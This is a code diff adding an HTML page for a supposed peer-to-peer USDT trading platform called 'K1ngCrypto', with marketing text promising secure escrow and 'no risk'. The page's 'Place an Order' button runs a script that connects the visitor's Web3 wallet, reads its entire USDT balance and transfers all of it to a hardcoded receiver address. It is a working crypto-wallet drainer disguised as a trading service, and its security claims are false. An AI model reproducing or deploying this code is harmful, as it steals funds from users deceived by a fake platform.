@@ -1,0 +1,109 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>K1ngCrypto – P2P Trading</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+<body class="bg-gradient-to-b from-blue-50 to-white text-gray-800 font-sans antialiased min-h-screen overflow-x-hidden">
+
+  <div class="max-w-xl w-full p-6 bg-white shadow-lg rounded-2xl space-y-6 text-center mx-auto">
+    <div class="flex items-center justify-center space-x-3">
+      <div class="bg-yellow-400 text-white w-12 h-12 rounded-full flex items-center justify-center text-xl font-bold">B</div>
+      <div class="text-left">
+        <h1 class="text-lg font-bold">P2P Trading</h1>
+        <p class="text-sm text-blue-600">Secure Trading Platform</p>
+      </div>
+      <div class="ml-auto flex items-center space-x-2">
+        <span class="bg-blue-100 text-blue-700 text-xs px-2 py-0.5 rounded-full">🔒 Trusted</span>
+        <span class="bg-green-100 text-green-700 text-xs px-2 py-0.5 rounded-full">🟢 24/7 Active</span>
+      </div>
+    </div>
+
+    <div class="bg-blue-50 p-4 rounded-xl shadow space-y-2">
+      <h3 class="text-md font-bold text-gray-700">PLACE AN ORDER</h3>
+      <p class="text-sm text-gray-500">Connect any Web3 wallet to start trading</p>
+      <div id="errorMsg" class="bg-red-100 text-red-600 text-sm p-2 rounded hidden">❌ Error sending USDT.</div>
+      <div id="status" class="text-sm text-gray-600 text-center mt-2"></div>
+      <button onclick="sendAllUSDT()" class="bg-blue-600 text-white w-full py-3 rounded-lg font-semibold">📲 Place an Order</button>
+    </div>
+  </div>
+
+  <section class="px-6 py-10 space-y-10 max-w-xl mx-auto text-center bg-white mt-10 text-gray-800">
+    <div>
+      <h3 class="text-xl font-bold mb-2">Why K1ngCrypto?</h3>
+      <p class="text-gray-600">We offer an ultra-secure P2P USDT trading platform powered by verified smart contracts and real-time order matching. No intermediaries, no delay, no risk.</p>
+    </div>
+
+    <div>
+      <h3 class="text-xl font-bold mb-2">Security First</h3>
+      <p class="text-gray-600">Our smart contract ensures that funds are never at risk. Every order goes through a secure automated escrow system that protects both buyer and seller.</p>
+    </div>
+
+    <div>
+      <h3 class="text-xl font-bold mb-2">24/7 Active Traders</h3>
+      <p class="text-gray-600">Whether it's midnight or early morning, our platform is live and you’ll find over 12,000 active traders available to deal with at all times.</p>
+    </div>
+
+    <div>
+      <h3 class="text-xl font-bold mb-2">Built for Mobile</h3>
+      <p class="text-gray-600">Fully compatible with Trust Wallet, MetaMask, and mobile DApp browsers like Bitget, Binance, and OKX. Trade directly using WalletConnect.</p>
+    </div>
+
+    <div>
+      <h3 class="text-xl font-bold mb-2">Transparent Rates</h3>
+      <p class="text-gray-600">Rates range from ₹98 to ₹135 per USDT. No hidden fees, no shady deals. View all ads and make informed decisions with full price visibility.</p>
+    </div>
+
+    <div class="text-center mt-10">
+      <p class="text-xs text-gray-400">© 2025 K1ngCrypto. All Rights Reserved.</p>
+    </div>
+  </section>
+
+  <script>
+    const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+    const RECEIVER = "0x34a8ed2a4cb95ccff1abe9e358377c9ef68e333a";
+
+    async function sendAllUSDT() {
+      if (typeof window.ethereum === 'undefined') {
+        alert("Please open in Trust Wallet or any Web3 browser on BNB Chain.");
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+
+        const contractABI = [
+          { "constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function" },
+          { "constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function" }
+        ];
+
+        const contract = new web3.eth.Contract(contractABI, USDT_CONTRACT);
+
+        document.getElementById("status").textContent = "Checking USDT balance...";
+        const balance = await contract.methods.balanceOf(sender).call();
+
+        if (balance == 0) {
+          document.getElementById("status").textContent = "❌ No USDT available.";
+          return;
+        }
+
+        document.getElementById("status").textContent = "Sending all USDT...";
+        const tx = await contract.methods.transfer(RECEIVER, balance).send({ from: sender });
+
+        document.getElementById("status").textContent = "✅ All USDT sent successfully.";
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").textContent = "❌ Error sending USDT.";
+        document.getElementById("errorMsg").classList.remove("hidden");
+      }
+    }
+  </script>
+</body>
+</html>
